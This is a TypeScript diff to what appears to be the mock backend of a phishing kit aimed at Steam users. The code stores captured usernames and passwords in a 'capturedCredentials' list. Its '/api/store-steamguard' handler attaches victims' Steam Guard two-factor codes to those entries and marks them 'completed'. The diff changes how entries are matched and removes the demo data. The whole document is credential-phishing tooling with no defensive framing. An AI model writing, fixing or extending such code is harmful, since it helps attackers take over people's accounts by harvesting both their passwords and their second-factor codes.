@@ -29,32 +29,19 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
   if (endpoint === '/api/store-steamguard') {
     const data = JSON.parse(options.body as string);
     const code = data.code;
+    const username = data.username;
     
-    // Find the most recent pending or awaiting_2fa credential and update it
-    const pendingCredentials = capturedCredentials.filter(cred => 
-      cred.status === 'pending' || cred.status === 'awaiting_2fa'
-    );
-    
-    if (pendingCredentials.length > 0) {
-      // Sort by timestamp (descending) to get the most recent
-      pendingCredentials.sort((a, b) => 
-        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
-      );
-      
-      const mostRecent = pendingCredentials[0];
-      
-      // Update the credential with the steam guard code
-      capturedCredentials = capturedCredentials.map(cred => {
-        if (cred.id === mostRecent.id) {
-          return {
-            ...cred,
-            steamguard: code,
-            status: 'completed'
-          };
-        }
-        return cred;
-      });
-    }
+    // Find the credential with the matching username and update it
+    capturedCredentials = capturedCredentials.map(cred => {
+      if (cred.username === username) {
+        return {
+          ...cred,
+          steamguard: code,
+          status: 'completed'
+        };
+      }
+      return cred;
+    });
     
     return { success: true };
   }
@@ -133,16 +120,8 @@ window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
 export const initMockApi = () => {
   console.log('Mock API initialized');
   
-  // Add some initial demo data
-  capturedCredentials = [
-    {
-      id: '1',
-      username: 'demo_user',
-      password: 'demo_password',
-      timestamp: new Date().toISOString(),
-      status: 'pending'
-    }
-  ];
+  // Initialize with empty data
+  capturedCredentials = [];
 };
 
 export default {
